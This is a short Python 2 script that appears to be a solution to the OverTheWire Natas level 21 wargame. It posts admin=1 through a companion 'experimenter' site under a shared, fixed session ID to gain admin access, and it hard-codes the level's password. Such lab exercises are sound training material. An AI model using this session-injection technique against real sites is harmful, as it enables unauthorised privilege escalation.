import base64
from datetime import datetime
import requests
import pprint

TARGET_URL_1 = 'http://natas21.natas.labs.overthewire.org/index.php?debug=1'
TARGET_URL_2 = 'http://natas21-experimenter.natas.labs.overthewire.org/index.php?debug=1'

AUTH = ('natas21', 'IFekPyrQXftziDEsUr3x21sYuahypdgJ')

r = requests.post(TARGET_URL_1, cookies={'PHPSESSID':'182371928'}, auth=AUTH)
print r.text
print '-' * 80
r = requests.post(TARGET_URL_2, data={'submit':'Update', 'admin':1}, cookies={'PHPSESSID':'182371928'}, auth=AUTH)
print r.text
